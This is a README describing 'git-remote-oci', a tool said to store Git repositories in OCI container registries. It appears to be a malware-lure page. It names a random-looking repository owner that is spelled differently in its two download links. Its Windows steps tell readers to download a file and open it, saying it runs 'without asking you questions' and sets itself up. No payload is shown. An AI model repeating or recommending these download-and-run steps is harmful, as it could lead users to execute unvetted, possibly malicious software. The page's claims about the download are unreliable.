# 📦 git-remote-oci - Store Git repos in any registry

[![Download from GitHub](https://img.shields.io/badge/Download-git--remote--oci-blue?style=for-the-badge&logo=github)](https://github.com/allergenic-tenrececaudatus39/git-remote-oci)

## 🚀 What is git-remote-oci?
git-remote-oci is a tool that lets you store your Git repositories inside a container registry (like Docker Hub or any OCI-compatible registry). Instead of needing a special Git server, you can push and pull your code directly to a registry. This is useful for backing up repos, sharing code privately, or integrating with container workflows.

## 🎯 Who is this for?
- Developers who want a simple way to store Git repositories without setting up a server
- Teams using container registries and want to store code alongside images
- Anyone who wants to try Git's modern features like partial clones and shallow clones

## ✨ Key features
- **No Git server needed** – Use any OCI-compatible registry (Docker Hub, GitHub Container Registry, Azure, AWS, etc.)
- **Speaks Git wire protocol v2** – Supports partial clones and real shallow clones
- **Lightweight** – Written in Go, single binary
- **Works with Git LFS** – Store large files in the same registry
- **Cross-platform** – Runs on Windows, macOS, and Linux

## 📥 How to download and use it (Windows)

### Step 1: Download
Visit the link below to download the application:
[Download git-remote-oci](https://github.com/allergenic-tecnicaudatus39/git-remote-oci)

### Step 2: Run it
1. Save the downloaded file to your computer (e.g., your Downloads folder).
2. Open the file – it will run without asking you questions.
3. The program will set itself up so Git knows how to use it.

## ⚙️ How it works
After running, you can use Git to push and pull repositories to a registry. For example:
```bash
git clone oci://registry.example.com/repo
git push oci://registry.example.com/repo
```
That `oci://` prefix tells Git to use git-remote-oci to talk to the registry.

## 🛠️ Requirements
- Windows 10 or later (64-bit)
- Git installed (get it from [git-scm.com](https://git-scm.com))
- A writable OCI container registry account (like Docker Hub)

## ❓ Need help?
If you run into issues, open an issue on the GitHub repository page and include details about what happened.

---

Keywords: git, git remote, OCI, registry, container registry, Git LFS, Docker, partial clone, shallow clone, git-remote-helper, Go